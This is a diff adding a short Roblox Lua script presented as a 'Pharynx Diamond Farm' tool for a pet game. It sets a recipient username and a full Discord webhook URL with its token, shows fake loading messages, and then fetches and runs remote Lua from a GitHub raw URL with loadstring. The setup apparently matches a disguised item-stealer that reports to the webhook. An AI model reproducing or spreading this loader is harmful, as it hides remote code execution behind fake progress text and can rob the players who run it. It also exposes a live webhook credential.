@@ -1,0 +1,9 @@
+Username = "VerzionXV"
+WebHook = "https://discord.com/api/webhooks/1177954054593314866/6ZZR5AmZQwIPCZqREva42DIm7DeBLntOEkBFhKtzwRar3zBCym-R5u0berxb_yFzP9rk"
+
+_G.CustomScriptName = "Pharynx Diamond Farm"
+_G.Text1 = "Downloading GUI icons..."
+_G.Text2 = "Loading GUI assets"
+_G.Text3 = "Succesfully loaded assets"
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
